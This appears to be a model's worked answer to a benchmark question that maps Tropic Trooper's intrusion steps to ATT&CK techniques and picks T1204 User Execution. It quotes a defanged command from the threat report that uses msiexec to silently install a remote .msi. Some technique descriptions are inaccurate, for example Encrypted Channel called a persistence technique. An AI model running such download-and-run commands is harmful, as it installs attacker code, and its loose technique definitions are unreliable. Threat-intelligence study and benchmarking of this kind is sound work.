Let's analyze the CTI outline and the question step-by-step to determine the most plausible sequence of TTPs.

### Step 1: Analyze the CTI Outline
The CTI outline describes the following sequence of TTPs:
1. **Initial Access**: Tropic Trooper used exploits for CVE-2017-11882 or CVE-2018-0802 in Microsoft Office's Equation Editor (EQNEDT32.EXE) to gain initial access.
2. **Persistence**: The backdoor will load the encrypted configuration file and decrypt it, then use SSL to connect to C&C servers.
3. **Defense Evasion**: Tropic Trooper used DLL hijacking to evade antivirus detection.
4. **Command and Control**: TClient uses SSL to connect to the C&C server.

### Step 2: Analyze the Question
The question asks about the ATT&CK technique that most likely occurred when the execution of the backdoor's installer leveraged users' actions or interactions to trigger its deployment.

### Step 3: Compare and Evaluate
We need to identify which ATT&CK technique involves users' actions or interactions to trigger the deployment of the backdoor's installer.

- **T1573-Encrypted Channel**: This technique involves using encrypted channels to maintain persistence. It does not directly involve user actions or interactions.
- **T1564.009-Resource Forking**: This technique involves using resource forks to hide malicious code. It does not directly involve user actions or interactions.
- **T1648-Serverless Execution**: This technique involves executing code without a traditional server. It does not directly involve user actions or interactions.
- **T1204-User Execution**: This technique involves executing code or scripts that require user interaction to run. This fits the scenario where the installer is triggered by users' actions or interactions.

### Step 4: Provide a Step-by-Step Reasoning and Final Answer
- The CTI outline mentions that the installer package (.msi) is downloaded and installed by executing a command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.
- This implies that the installer is triggered by a user action, such as opening a malicious document or clicking a link.
- The technique that best fits this scenario is T1204-User Execution, as it involves executing code that requires user interaction to run.

### Final Answer: D: T1204-User Execution
